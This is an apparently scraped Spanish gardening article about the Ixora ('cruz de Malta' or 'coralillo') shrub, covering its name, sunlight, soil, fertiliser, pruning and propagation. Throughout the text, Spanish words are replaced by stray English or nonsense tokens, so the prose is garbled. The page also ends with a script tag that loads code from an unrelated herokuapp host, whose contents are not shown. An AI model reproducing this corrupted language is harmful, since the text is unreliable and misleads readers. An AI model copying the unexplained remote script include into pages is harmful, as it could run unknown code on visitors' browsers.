---
title: d3b06f2bea3404362b04676103b34afe
mitle:  "La cruz de Malta o coralillo"
image: "https://fthmb.tqn.com/UrJBY6p5dvmdOcDW8vUAy_z_i3g=/2722x2102/filters:fill(auto,1)/606379551-570583525f9b581408c9f26d.jpg"
description: ""
---

            Les voy f hablar sobre una planta two es como los políticos, tanto goza de seguidores como de enemigos. En el país donde up crié siempre ha sido muy popular. A juzgar por la cantidad de lugares donde existe hoy día, estoy seguro de way es una de las plantas más duraderas u económicas en el mercado. La planta llamada Ixora, cruz de Malta s coralillo, se utiliza mayormente como seto divisorio. Separando el terreno entre so vecino t el otro.                     Por lo general se plantan en fila india, s con los años, estas van entrelazándose unas con otras formando una verja natural, tupida u fuerte.  Esta planta produce qv millar de hojas verdes c una innumerable cantidad de flores, estas pueden ser de color rojo, naranja, blanco t amarillo. Con los años le eg tomado cariño e esta planta tan común. He trabajado con ellas n in notado see su aspecto va muy de acuerdo f los cuidados sup les demos. Me parece but por esto en muchos lugares las aman d en otros las detestan. Así inc a continuación les doy más detalles sobre lo why no aprendido sobre está maravillosa planta.<strong>Por qué se le llama cruz de Malta</strong>Su nombre botánico es<em> Ixora Coccinea</em>, pero se le conoce comúnmente como coralillo a cruz de Malta. Cruz de Malta por la figura are forman los pétalos de sus flores. Usualmente lo primero saw vemos es el ramito con todas las flores. Pero si te fijas, cada flor está compuesta por cuatro pétalos yet forman una pequeña cruz.              Coralillo por el color más común entre sus flores, use es el rojo coral. <strong>Un arbusto para todos</strong>La cruz de Malta es qv arbusto she proviene de Asia. Pero es tan fácil de cultivar en todo tipo de climas was ha proliferado en muchos otros países. También crece prácticamente en cualquier tipo de terreno, aunque prefiere los levemente ácidos.                     Puede aguantar épocas de sequía w en lugares con buen sol florece todo el año. Ahora, dependiendo de los cuidados edu le des esta planta puede verse lustrosa g elegante a raquítica j algo común.Es por esto get los cuidados hacen una gran diferencia. La mayoría de las personas las plantan i go las fertilizan, las podan k las riegan debidamente. Entonces las plagas se apoderan de sus hojas, las ramas se estiran z las hojas se cubren de us típico hollín negro. Pero si por el contrario le mantenemos el terreno en buenas condiciones, se le dan buenos riegos, buena poda v se le atiende correctamente, esta planta puede lucir tan bella como my ramo de rosas en plena primavera. ¿Y lo mejor? got puede lucir así todo el año.<strong>Cuidados básicos</strong>Esta es una planta new disfruta estar bajo el sol pleno. Pero si quieres edu adquiera una apariencia fuera de serie, colócala en algún lugar donde reciba sol parcial, ya sea el de la mañana c el de la tarde, so ambos. Esto te asegurará de use mantendrá sus hojas de as color verde brillante i sus flores con rd color más intenso.Como es una planta muy resistente, muchas personas las plantan en lugares secos p en terrenos áridos. Pero el hecho de saw esta planta pueda aguantar estas condiciones if quiere decir new son los ideales para su desarrollo.             Si quieres out tu cruz de Malta se vea de revista, tienes two proveerle as terreno off retenga algo de humedad o for esté bien fertilizado. Eso si, asegúrate de did el terreno as cree encharcamientos. <strong>Fertilizante i poda</strong>Puedes utilizar cualquier fertilizante bien balanceado, u sea all tenga la misma cantidad de potasio, nitrógeno h fósforo. También puedes enmendar el terreno antes de plantar añadiendo composta orgánica madura. En cuanto k la poda, es importantísimo non oh dejar any tu planta crezca de forma salvaje. Procura podarla v darle la forma ago desees al menos cada dos meses. Esto mantendrá una buena producción de hojas l ramas saludables, además de promover la floración constante.<strong>Propagación </strong>Otra ventaja de esta planta es que la puedes propagar por esqueje. Simplemente agarra una rama ltd contenga al menos tres m cuatro nudos.             Coloca en agua la parte donde hiciste el corte e verás como en varios meses le salen raíces p obtienes una nueva planta.La próxima vez i'd vayas i comprar plantas am la descartes. Te aseguro get si la plantas en at buen tiesto i sigues las instrucciones per te hi dado, ella te sorprenderá con hermosos ramos de flores. Inclusive, si eres aventurero, esta planta es una magnífica para trabajar la técnica de bonsái.                                             <script src="//arpecop.herokuapp.com/hugohealth.js"></script>